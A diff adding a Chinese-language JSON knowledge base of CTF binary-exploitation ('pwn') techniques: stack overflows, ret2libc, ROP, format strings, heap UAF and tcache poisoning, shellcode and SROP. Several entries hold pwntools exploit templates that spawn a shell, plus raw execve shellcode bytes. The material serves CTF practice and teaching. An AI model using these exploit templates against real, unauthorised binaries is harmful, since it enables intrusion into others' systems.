@@ -1,0 +1,128 @@
+{
+  "category": "pwn",
+  "description": "Pwn题型常见解题模式与经验库",
+  "patterns": [
+    {
+      "id": "pwn-stack-overflow-ret2text",
+      "name": "栈溢出 - ret2text",
+      "difficulty": "easy",
+      "indicators": ["gets()", "scanf(\"%s\")", "read()无长度限制", "存在后门函数", "NX开启PIE关闭"],
+      "methodology": [
+        "1. checksec检查保护机制",
+        "2. 确认存在栈溢出（gets/scanf等危险函数）",
+        "3. 找到后门函数地址（如system('/bin/sh')或直接cat flag的函数）",
+        "4. 计算padding长度（到返回地址的偏移）",
+        "5. 构造payload: padding + 后门函数地址"
+      ],
+      "tools": ["pwntools", "gdb+pwndbg/peda", "checksec"],
+      "script_template": "from pwn import *\n\n# context.log_level = 'debug'\np = remote('host', port)  # 或 process('./binary')\n\npadding = b'A' * offset  # 用cyclic确定offset\nbackdoor = 0x401234  # 后门函数地址\n\npayload = padding + p64(backdoor)\np.sendline(payload)\np.interactive()"
+    },
+    {
+      "id": "pwn-stack-overflow-ret2libc",
+      "name": "栈溢出 - ret2libc",
+      "difficulty": "medium",
+      "indicators": ["NX开启", "无后门函数", "有puts/printf等输出函数", "可以泄露地址"],
+      "methodology": [
+        "1. checksec确认NX开启（不能执行shellcode）",
+        "2. 泄露libc地址：利用puts/printf输出GOT表中的函数地址",
+        "3. 计算libc基址：泄露地址 - 函数在libc中的偏移",
+        "4. 计算system和/bin/sh地址",
+        "5. 第二次溢出调用system('/bin/sh')"
+      ],
+      "tools": ["pwntools", "LibcSearcher", "libc-database"],
+      "script_template": "from pwn import *\n\nelf = ELF('./binary')\nlibc = ELF('./libc.so.6')  # 或使用LibcSearcher\np = remote('host', port)\n\n# 第一次溢出：泄露puts的真实地址\npop_rdi = 0x401233  # ROPgadget找到的gadget\nret = 0x40101a  # 栈对齐\n\npayload1 = b'A' * offset\npayload1 += p64(pop_rdi)\npayload1 += p64(elf.got['puts'])\npayload1 += p64(elf.plt['puts'])\npayload1 += p64(elf.sym['main'])  # 返回main重新利用\n\np.sendline(payload1)\nputs_addr = u64(p.recvline().strip().ljust(8, b'\\x00'))\n\n# 计算libc基址\nlibc_base = puts_addr - libc.sym['puts']\nsystem = libc_base + libc.sym['system']\nbin_sh = libc_base + next(libc.search(b'/bin/sh'))\n\n# 第二次溢出：getshell\npayload2 = b'A' * offset\npayload2 += p64(ret)  # Ubuntu需要栈对齐\npayload2 += p64(pop_rdi)\npayload2 += p64(bin_sh)\npayload2 += p64(system)\n\np.sendline(payload2)\np.interactive()"
+    },
+    {
+      "id": "pwn-stack-overflow-rop",
+      "name": "栈溢出 - ROP链",
+      "difficulty": "hard",
+      "indicators": ["NX开启", "需要多个gadget", "syscall调用", "execve"],
+      "methodology": [
+        "1. 使用ROPgadget/ropper找到可用的gadget",
+        "2. 构造ROP链实现execve('/bin/sh', 0, 0)",
+        "3. 或构造ROP链调用mprotect使栈可执行后跳转shellcode"
+      ],
+      "tools": ["ROPgadget", "ropper", "pwntools ROP"],
+      "key_gadgets": [
+        "pop rdi; ret",
+        "pop rsi; ret",
+        "pop rdx; ret",
+        "pop rax; ret",
+        "syscall; ret",
+        "mov rdi, rax; ret"
+      ]
+    },
+    {
+      "id": "pwn-format-string",
+      "name": "格式化字符串漏洞",
+      "difficulty": "medium",
+      "indicators": ["printf(buf)", "格式化字符串直接使用用户输入", "%p泄露", "%n写入"],
+      "methodology": [
+        "1. 确认格式化字符串漏洞（输入%p%p%p看是否泄露栈数据）",
+        "2. 确定输入在栈上的偏移（第几个%p能看到输入）",
+        "3. 泄露信息：用%s读取GOT表地址，或%p泄露栈/libc地址",
+        "4. 任意写：用%n/%hn/%hhn覆写GOT表或返回地址"
+      ],
+      "tools": ["pwntools fmtstr_payload", "手动构造"],
+      "script_template": "from pwn import *\n\n# 确定偏移\n# 输入 AAAA%p%p%p%p%p%p... 找到0x41414141的位置\n\n# 使用pwntools自动构造\nfrom pwnlib.fmtstr import fmtstr_payload\n\noffset = 6  # 格式化字符串参数偏移\ntarget_addr = elf.got['printf']  # 要覆写的地址\nnew_value = elf.sym['win']  # 要写入的值\n\npayload = fmtstr_payload(offset, {target_addr: new_value})"
+    },
+    {
+      "id": "pwn-heap-uaf",
+      "name": "堆利用 - Use After Free",
+      "difficulty": "hard",
+      "indicators": ["malloc/free", "free后指针未置空", "可以继续使用已释放的chunk"],
+      "methodology": [
+        "1. 分析堆管理逻辑，找到UAF漏洞",
+        "2. 释放chunk后重新分配相同大小的chunk",
+        "3. 新chunk会占据旧chunk的位置",
+        "4. 通过旧指针操作新chunk的数据"
+      ]
+    },
+    {
+      "id": "pwn-heap-tcache",
+      "name": "堆利用 - Tcache Poisoning",
+      "difficulty": "hard",
+      "indicators": ["glibc 2.26+", "tcache", "double free", "UAF"],
+      "methodology": [
+        "1. 利用UAF或double free修改tcache链表的fd指针",
+        "2. 将fd指向目标地址（如__free_hook）",
+        "3. 再次malloc获得目标地址的chunk",
+        "4. 写入system或one_gadget地址"
+      ]
+    },
+    {
+      "id": "pwn-shellcode",
+      "name": "Shellcode注入",
+      "difficulty": "easy",
+      "indicators": ["NX关闭", "可执行栈", "mmap可执行区域", "read+jmp"],
+      "methodology": [
+        "1. checksec确认NX关闭或存在可执行内存区域",
+        "2. 写入shellcode到可执行区域",
+        "3. 跳转到shellcode执行"
+      ],
+      "tools": ["pwntools shellcraft", "msfvenom"],
+      "script_template": "from pwn import *\n\ncontext.arch = 'amd64'\nshellcode = asm(shellcraft.sh())\n# 或手写短shellcode\n# shellcode = b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05'"
+    },
+    {
+      "id": "pwn-srop",
+      "name": "SROP (Sigreturn Oriented Programming)",
+      "difficulty": "hard",
+      "indicators": ["sigreturn gadget", "极少gadget", "syscall可用"],
+      "methodology": [
+        "1. 找到sigreturn和syscall gadget",
+        "2. 构造SigreturnFrame设置所有寄存器",
+        "3. 触发sigreturn恢复伪造的上下文",
+        "4. 执行execve('/bin/sh', 0, 0)"
+      ],
+      "tools": ["pwntools SigreturnFrame"],
+      "script_template": "from pwn import *\n\ncontext.arch = 'amd64'\nframe = SigreturnFrame()\nframe.rax = 59  # execve\nframe.rdi = bin_sh_addr\nframe.rsi = 0\nframe.rdx = 0\nframe.rip = syscall_addr\n\npayload = b'A' * offset\npayload += p64(sigreturn_gadget)\npayload += bytes(frame)"
+    }
+  ],
+  "common_tools_usage": {
+    "checksec": "checksec ./binary  # 检查保护机制: RELRO, Stack Canary, NX, PIE, ASLR",
+    "cyclic": "cyclic 200 | ./binary  # 生成pattern确定偏移\ncyclic -l 0x61616168  # 计算偏移",
+    "ROPgadget": "ROPgadget --binary ./binary --only 'pop|ret'\nROPgadget --binary ./binary --ropchain",
+    "one_gadget": "one_gadget ./libc.so.6  # 找到一键getshell的gadget",
+    "patchelf": "patchelf --set-interpreter ./ld-linux.so.2 ./binary\npatchelf --set-rpath . ./binary"
+  }
+}
